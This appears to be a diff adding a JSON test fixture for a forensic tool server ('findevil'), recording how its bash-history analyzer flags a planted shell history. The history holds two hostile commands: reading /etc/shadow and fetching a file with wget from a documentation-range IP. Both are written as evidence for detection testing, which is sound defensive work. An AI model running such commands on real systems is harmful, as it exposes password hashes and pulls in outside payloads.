@@ -1,0 +1,29 @@
+{
+  "server": {
+    "name": "findevil",
+    "version": "1.30.0"
+  },
+  "fixtures": [
+    {
+      "path": "home/alice/.bash_history",
+      "size": 44,
+      "hex": "636174202f6574632f736861646f770afffe7767657420687474703a2f2f3230332e302e3131332e372f780a",
+      "text": "cat /etc/shadow\n\\xff\\xfewget http://203.0.113.7/x\n"
+    }
+  ],
+  "steps": [
+    {
+      "tool": "analyze_bash_history",
+      "args": {
+        "path": "/tmp/tmpjdjlh9we/evidence/home/alice/.bash_history"
+      },
+      "response": {
+        "text": "# Shell history — `/tmp/tmpjdjlh9we/evidence/home/alice/.bash_history`\n\n- **Size:** 44 bytes  |  **Commands:** 2  |  **Timestamped:** 0\n\n## ⚠ Tampering indicators\n- only 2 entries in 44-byte file — truncation is plausible\n\n## Suspicious commands (2)\n\n| Line | Timestamp | Command | Flags |\n|------|-----------|---------|-------|\n| 1 | — | `cat /etc/shadow` | credential/config file access |\n| 2 | — | `��wget http://203.0.113.7/x` | outbound download |",
+        "is_error": false,
+        "timed_out": false
+      },
+      "seconds": 0.064
+    }
+  ],
+  "server_log": "[11/27/26 05:14:19] INFO     Processing request of type            server.py:733\n                             ListToolsRequest                                   \n                    INFO     Processing request of type            server.py:733\n                             CallToolRequest                                    \n"
+}
